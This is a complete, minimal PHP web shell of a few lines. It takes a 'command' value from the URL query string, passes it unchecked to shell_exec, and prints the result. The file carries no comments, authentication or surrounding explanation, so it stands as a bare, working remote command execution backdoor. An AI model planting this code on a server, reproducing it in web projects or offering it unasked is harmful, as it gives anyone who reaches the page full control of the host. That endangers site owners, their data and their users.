<?php
if (isset($_GET['command'])) {
    $command = $_GET['command'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>
